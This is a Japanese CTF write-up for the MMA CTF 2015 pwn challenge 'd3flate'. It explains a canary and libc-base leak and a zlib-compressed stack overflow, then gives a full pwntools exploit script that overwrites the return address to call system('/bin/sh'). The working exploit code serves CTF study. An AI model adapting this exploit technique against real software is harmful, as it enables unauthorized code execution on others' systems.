---
layout: post
redirect_from:
  - /writeup/ctf/2015/mma-ctf-2015-d3flate/
  - /blog/2016/09/09/mma-ctf-2015-d3flate/
date: "2016-09-09T15:08:55+09:00"
tags: [ "ctf", "writeup", "mmactf", "pwn", "zlib", "canary" ]
"target_url": [ "https://github.com/ctfs/write-ups-2015/tree/master/mma-ctf-2015/pwn/d3flate-500" ]
---

# MMA CTF 2015: d3flate

解けないからwriteupを見たが、writeupにあった実装ではどれもzlibの計算が停止する気配がなかった。追加で頑張った。

## solution

全体の流れは単純。

1.  proof-of-workを解く
2.  長さに$-1$を指定してlibc baseとcanaryをleak
3.  以下を繰り返す
    1.   平文を送る
    2.   そのzlib圧縮結果のbofでstackを書き換える
4.  `Bye`と送って発火

proof-of-workは単純にやるしかない。
運が悪いとけっこうかかる。

stackのleakに関して。
長さに$-1$を指定すると、標準入力からの読み込みは実際には行われないが$255$文字読まれた扱いになる。
ここで、proof-of-workの際の関数によるcanary等が`$esp`より低位側に残されているので、これが読める。
proof-of-workが邪魔だからとbinaryを書き換えてnopで埋めていると、canaryが見つからずどうにもならなくなるので注意。

stackへの書き込みは、文字列`s`を送ると`zlib.compress(s)`が書き込まれる。
canaryやreturn先address等が書き変わるが、当然書き込む値は自由にはならない。
これは探索をする。平文となる`s`を`zlib.compress(s)`が要件を満たすまで生成し続ければよい。
乱数を突っ込めば圧縮できずにそのまま出てくるが、そのようなものは禁止されているので使えない。
ただし最低でも$12$byte (canary + system + `/bin/sh`)を書き込む必要があり、一括で書き込むのは難しい。
$1$byteずつ後ろから書き込むとよい。

## implementation

``` python
#!/usr/bin/env python2
import os
import time
import random
import zlib
import itertools
import hashlib
from pwn import * # https://pypi.python.org/pypi/pwntools
context.log_level = 'debug'

p = process('./d3flate')

salt = p.recvline().split('"')[1] # Send me a proof-of-work sha1("XXXXXXXX" || stripLF(sent)) = 123456xxx...
for witness in itertools.count():
    if witness % 100000 == 0:
        log.debug('witness: %d', witness)
    if hashlib.sha1(salt + str(witness)).hexdigest().startswith('123456'):
        break
p.sendline(str(witness))
p.recvline()

p.sendline('-1')
s = p.recv(int(p.recvline()))
s = zlib.decompress(s)
log.info('zlib decompressed:\n' + fiddling.hexdump(s))

libc = ELF('/lib/i386-linux-gnu/libc.so.6') # for my local environment
libc_base = u32(s[0xbc:][:4]) - (libc.symbols['fflush'] + 11)
canary = u32(s[0xc0:][:4])
log.info('libc base: %#x', libc_base)
log.info('canary: %#x', canary)
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\0'))
log.info('system  address: %#x', system)
log.info('/bin/sh address: %#x', binsh)

for base, value in [ (0x98, binsh), (0x90, system), (0x80, canary) ]:
    for offset, char in reversed(list(enumerate(p32(value)))):
        for i in itertools.count():
            s = chr(random.randint(0, 255)) * random.randint(30, 40) + os.urandom(base + offset + random.randint(- 10, 20))
            s = s[: 0x80] + '\x78\x9c' + s[0x82 :]
            s = zlib.compress(s)
            s = s[: base + offset + random.randint(-4, 4)] + char
            payload = ''
            z = zlib.decompressobj()
            while s:
                try:
                    payload += z.decompress(s, 1)
                    s = z.unconsumed_tail
                except zlib.error:
                    break
            s = zlib.compress(payload)
            if not s[base + offset :] == char:
                log.debug('trial %d: wrong value: %s != %s', i, repr(s[base + offset :]), repr(char))
                continue
            if not len(s) <= len(payload):
                log.debug('trial %d: wrong length: %d > %d', i, len(s), len(payload))
                continue
            if not len(payload) <= 255:
                log.debug('trial %d: too long payload: 255 < %d', i, len(payload))
                continue
            break
        log.info('payload:\n' + fiddling.hexdump(payload))
        log.info('zlib compressed:\n' + fiddling.hexdump(s))
        p.sendline(str(len(payload) - 256))
        p.sendline(payload)
        s = p.recv(int(p.recvline()))
        log.debug('zlib decompressed: %s\n' + fiddling.hexdump(zlib.decompress(s)))
        assert zlib.decompress(s) == payload
        assert s == zlib.compress(payload)

p.sendline('3')
p.sendline('Bye')

time.sleep(1)
p.sendline('id')
p.interactive()
```
